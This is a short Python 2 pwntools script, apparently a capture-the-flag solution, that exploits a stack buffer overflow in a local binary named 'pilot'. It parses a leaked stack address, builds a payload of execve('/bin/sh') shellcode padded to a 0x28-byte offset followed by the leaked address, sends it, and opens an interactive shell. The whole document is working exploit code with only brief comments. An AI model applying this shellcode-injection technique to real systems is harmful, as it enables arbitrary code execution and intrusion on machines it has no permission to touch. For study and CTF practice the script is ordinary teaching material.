from pwn import *

#Establish target process
target = process("./pilot")


#print off stuff we don't care about
print target.recvuntil('[*]Good Luck Pilot!....\n');


#get the address
leak = target.recvline()
leak = leak.replace('[*]Location:','');

#convert to int
leak = int(leak,16);

#print leak
print "The leak is: " + hex(leak)

#Create the payload. Shellcode + offset + the leak address
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
offset = "0"*(0x28 - len(shellcode))
payload = shellcode + offset + p64(leak)


#Send the payload
target.send(payload);

#goto interactive
target.interactive();